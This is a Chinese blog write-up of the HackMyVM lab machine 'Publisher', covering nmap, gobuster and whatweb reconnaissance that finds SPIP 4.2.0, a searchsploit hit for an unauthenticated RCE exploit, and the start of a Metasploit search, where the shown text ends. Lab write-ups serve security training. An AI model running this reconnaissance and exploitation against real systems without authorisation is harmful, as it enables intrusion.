@@ -1,0 +1,1019 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>HMV publisher - Zsm Blog</title><meta name="Description" content="Zsm Blog,crypto,ctf,nodejs,wp,密码学"><meta property="og:url" content="https://www.zhuangsanmeng.xyz/hmv_publisher/">
+  <meta property="og:site_name" content="Zsm Blog">
+  <meta property="og:title" content="HMV publisher">
+  <meta property="og:description" content="publisher 靶场链接 https://hackmyvm.eu/machines/machine.php?vm=Publisher
+日常扫描 ip给了是 . . . 8
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ┌──(kali㉿kali)-[~] └─$ nmap -sV -sC -T4 -Pn -p- 192.168.31.8 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-04 20:46 HKT Nmap scan report for 192.168.31.8 Host is up (0.0017s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA) | 256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA) |_ 256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Publisher&#39;s Pulse: SPIP Insights &amp; Tips MAC Address: 08:00:27:E4:F1:F5 (Oracle VirtualBox virtual NIC) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.56 seconds dirb和dirsearch都扫不出来什么东西，换gobuster试试">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-03-05T12:23:21+08:00">
+    <meta property="article:modified_time" content="2025-03-05T12:23:21+08:00">
+    <meta property="article:tag" content="渗透">
+    <meta property="og:image" content="https://www.zhuangsanmeng.xyz/">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://www.zhuangsanmeng.xyz/">
+  <meta name="twitter:title" content="HMV publisher">
+  <meta name="twitter:description" content="publisher 靶场链接 https://hackmyvm.eu/machines/machine.php?vm=Publisher
+日常扫描 ip给了是 . . . 8
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ┌──(kali㉿kali)-[~] └─$ nmap -sV -sC -T4 -Pn -p- 192.168.31.8 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-04 20:46 HKT Nmap scan report for 192.168.31.8 Host is up (0.0017s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA) | 256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA) |_ 256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Publisher&#39;s Pulse: SPIP Insights &amp; Tips MAC Address: 08:00:27:E4:F1:F5 (Oracle VirtualBox virtual NIC) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.56 seconds dirb和dirsearch都扫不出来什么东西，换gobuster试试">
+<meta name="application-name" content="Zsm blog">
+<meta name="apple-mobile-web-app-title" content="Zsm blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/logo.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.zhuangsanmeng.xyz/hmv_publisher/" /><link rel="prev" href="https://www.zhuangsanmeng.xyz/hmv_hackingtoys/" /><link rel="next" href="https://www.zhuangsanmeng.xyz/hmv_smol/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HMV publisher",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.zhuangsanmeng.xyz\/hmv_publisher\/"
+        },"genre": "posts","keywords": "渗透","wordcount":  2183 ,
+        "url": "https:\/\/www.zhuangsanmeng.xyz\/hmv_publisher\/","datePublished": "2025-03-05T12:23:21+08:00","dateModified": "2025-03-05T12:23:21+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Zsm"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Zsm Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" /></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/" title="About"> 关于 </a><a class="menu-item" href="/friend/" title="Friend"> 友链 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Zsm Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" /></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="About">关于</a><a class="menu-item" href="/friend/" title="Friend">友链</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+    <h2 class="toc-title">Contents</h2>
+    <div class="toc-content" id="toc-content-auto"></div>
+</div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HMV publisher</h1><div class="post-meta">
+        <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Zsm</a></span>&nbsp;<span class="post-category">included in <a href="/categories/%E9%9D%B6%E5%9C%BA/"><i class="far fa-folder fa-fw"
+                    aria-hidden="true"></i>靶场</a></span></div>
+        <div class="post-meta-line">
+    
+
+    
+        
+
+        
+        
+            <span id="busuanzi_container_value_page_pv"><i class="far fa-eye fa-fw"></i>
+                
+                <span id="busuanzi_value_page_pv"></span>&nbsp;views</span>
+        
+    
+
+<i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-03-05">2025-03-05</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2183 words&nbsp;
+            <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;<span id="/hmv_publisher/" class="leancloud_visitors" data-flag-title="HMV publisher">
+                <i class="far fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span
+                    class=leancloud-visitors-count></span>&nbsp;views
+            </span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="">
+        <div class="details-summary toc-title">
+            <span>Contents</span>
+            <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#publisher">publisher</a>
+      <ul>
+        <li><a href="#靶场链接">靶场链接</a></li>
+        <li><a href="#日常扫描">日常扫描</a></li>
+        <li><a href="#漏洞利用">漏洞利用</a></li>
+        <li><a href="#提权">提权</a></li>
+        <li><a href="#为什么opt不可以访问呢">为什么OPT不可以访问呢？</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+    </div><div class="content" id="content"><h2 id="publisher">publisher</h2>
+<h3 id="靶场链接">靶场链接</h3>
+<p><a href="https://hackmyvm.eu/machines/machine.php?vm=Publisher" target="_blank" rel="noopener noreffer ">https://hackmyvm.eu/machines/machine.php?vm=Publisher</a></p>
+<h3 id="日常扫描">日常扫描</h3>
+<p>ip给了是 . . . 8</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ nmap -sV -sC -T4 -Pn -p- 192.168.31.8  
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-04 20:46 HKT
+</span></span><span class="line"><span class="cl">Nmap scan report for 192.168.31.8
+</span></span><span class="line"><span class="cl">Host is up (0.0017s latency).
+</span></span><span class="line"><span class="cl">Not shown: 65533 closed tcp ports (reset)
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+</span></span><span class="line"><span class="cl">| ssh-hostkey: 
+</span></span><span class="line"><span class="cl">|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
+</span></span><span class="line"><span class="cl">|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
+</span></span><span class="line"><span class="cl">|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+</span></span><span class="line"><span class="cl">|_http-server-header: Apache/2.4.41 (Ubuntu)
+</span></span><span class="line"><span class="cl">|_http-title: Publisher&#39;s Pulse: SPIP Insights &amp; Tips
+</span></span><span class="line"><span class="cl">MAC Address: 08:00:27:E4:F1:F5 (Oracle VirtualBox virtual NIC)
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 15.56 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>dirb和dirsearch都扫不出来什么东西，换gobuster试试</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="n">gobuster</span> <span class="n">dir</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">31.8</span><span class="o">/</span>  <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">dirb</span><span class="o">/</span><span class="n">big</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">x</span> <span class="n">php</span><span class="p">,</span><span class="n">html</span><span class="p">,</span><span class="n">txt</span><span class="p">,</span><span class="n">md</span> <span class="o">-</span><span class="n">b</span> <span class="mi">404</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="n">Gobuster</span> <span class="n">v3</span><span class="o">.</span><span class="mi">6</span>
+</span></span><span class="line"><span class="cl"><span class="n">by</span> <span class="n">OJ</span> <span class="n">Reeves</span> <span class="p">(</span><span class="err">@</span><span class="n">TheColonial</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">Christian</span> <span class="n">Mehlmauer</span> <span class="p">(</span><span class="err">@</span><span class="n">firefart</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Url</span><span class="p">:</span>                     <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">31.8</span><span class="o">/</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Method</span><span class="p">:</span>                  <span class="n">GET</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Threads</span><span class="p">:</span>                 <span class="mi">10</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Wordlist</span><span class="p">:</span>                <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">dirb</span><span class="o">/</span><span class="n">big</span><span class="o">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Negative</span> <span class="n">Status</span> <span class="n">codes</span><span class="p">:</span>   <span class="mi">404</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">User</span> <span class="n">Agent</span><span class="p">:</span>              <span class="n">gobuster</span><span class="o">/</span><span class="mf">3.6</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Extensions</span><span class="p">:</span>              <span class="n">php</span><span class="p">,</span><span class="n">html</span><span class="p">,</span><span class="n">txt</span><span class="p">,</span><span class="n">md</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Timeout</span><span class="p">:</span>                 <span class="mi">10</span><span class="n">s</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="n">Starting</span> <span class="n">gobuster</span> <span class="ow">in</span> <span class="n">directory</span> <span class="n">enumeration</span> <span class="n">mode</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="o">/.</span><span class="n">htpasswd</span>            <span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">403</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">277</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">/.</span><span class="n">htaccess</span><span class="o">.</span><span class="n">md</span>         <span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">403</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">277</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">/.</span><span class="n">htaccess</span><span class="o">.</span><span class="n">php</span>        <span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">403</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">277</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">/.</span><span class="n">htaccess</span><span class="o">.</span><span class="n">html</span>       <span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">403</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">277</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">/.</span><span class="n">htpasswd</span><span class="o">.</span><span class="n">md</span>         <span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">403</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">277</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">/.</span><span class="n">htaccess</span><span class="o">.</span><span class="n">txt</span>        <span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">403</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">277</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">/.</span><span class="n">htpasswd</span><span class="o">.</span><span class="n">php</span>        <span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">403</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">277</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">/.</span><span class="n">htpasswd</span><span class="o">.</span><span class="n">txt</span>        <span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">403</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">277</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">/.</span><span class="n">htpasswd</span><span class="o">.</span><span class="n">html</span>       <span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">403</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">277</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">/.</span><span class="n">htaccess</span>            <span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">403</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">277</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">images</span>               <span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">313</span><span class="p">]</span> <span class="p">[</span><span class="o">--&gt;</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">31.8</span><span class="o">/</span><span class="n">images</span><span class="o">/</span><span class="p">]</span>                                                                               
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">html</span>           <span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">8686</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">server</span><span class="o">-</span><span class="n">status</span>        <span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">403</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">277</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">spip</span>                 <span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">311</span><span class="p">]</span> <span class="p">[</span><span class="o">--&gt;</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">31.8</span><span class="o">/</span><span class="n">spip</span><span class="o">/</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">Progress</span><span class="p">:</span> <span class="mi">102345</span> <span class="o">/</span> <span class="mi">102350</span> <span class="p">(</span><span class="mf">100.00</span><span class="o">%</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="n">Finished</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>好东西，怪不得那么多佬喜欢这个，spip好像有一堆漏洞，看看版本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ whatweb http://192.168.31.8/spip/    
+</span></span><span class="line"><span class="cl">http://192.168.31.8/spip/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.31.8], MetaGenerator[SPIP 4.2.0], SPIP[4.2.0][http://192.168.31.8/spip/local/config.txt], Script[text/javascript], Title[Publisher], UncommonHeaders[composed-by,link,x-spip-cache]
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>找一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ searchsploit SPIP 4.2.0  
+</span></span><span class="line"><span class="cl">---------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl"> Exploit Title                                |  Path
+</span></span><span class="line"><span class="cl">---------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl">SPIP v4.2.0 - Remote Code Execution (Unauthen | php/webapps/51536.py
+</span></span><span class="line"><span class="cl">---------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl">Shellcodes: No Results
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="漏洞利用">漏洞利用</h3>
+<p>脚本报错，不知道为啥，msf启动</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">msf6</span> <span class="o">&gt;</span> <span class="n">search</span> <span class="n">SPIP</span> <span class="mf">4.2</span><span class="o">.</span><span class="mi">0</span>
